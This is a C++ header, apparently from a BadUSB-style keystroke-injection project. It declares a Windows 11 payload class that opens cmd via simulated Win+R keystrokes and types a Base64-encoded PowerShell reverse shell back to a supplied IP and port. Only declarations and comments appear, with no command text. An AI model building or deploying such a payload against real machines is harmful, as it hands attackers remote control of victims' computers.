/*
  ============================================================
  Win11Payload.h - Payload implementation for Windows 11 systems
  ============================================================

  Defines the Win11Payload class, which implements the Payload interface for Windows 11 operating systems. This class simulates key presses to open a terminal and executes a reverse shell payload using PowerShell.
  Tested on Windows 11.

  Author: NenshaM
  License: GPL v3
  Version: 1.0.0
  ============================================================
*/

#ifndef WIN11PAYLOAD_H
#define WIN11PAYLOAD_H

#include "Payload.h"

/**
 * @brief Payload implementation for Windows 11 systems. Opens a terminal and executes a reverse shell payload using PowerShell.
 * 
 * The openTerminal method simulates the key presses to open a terminal window (Win+R, then type "cmd" and press Enter). The executePayload method constructs a reverse shell command using PowerShell, encodes it in Base64, and then types it into the terminal before pressing Enter.
 * Tested on Windows 11.
 */
class Win11Payload : public Payload {
public:
    /**
     * @brief Open a terminal window.
     *
     * @param debug If true, print debug messages to the serial monitor
     */
    void openTerminal(bool debug=false) override;

    /**
     * @brief Execute the payload.
     *
     * @param ip_address IP address to connect back to
     * @param port_num Port number to connect back to
     * @param debug If true, print debug messages to the serial monitor
     */
    void executePayload(const char* ip_address, const char* port_num, bool debug=false) override;
};

#endif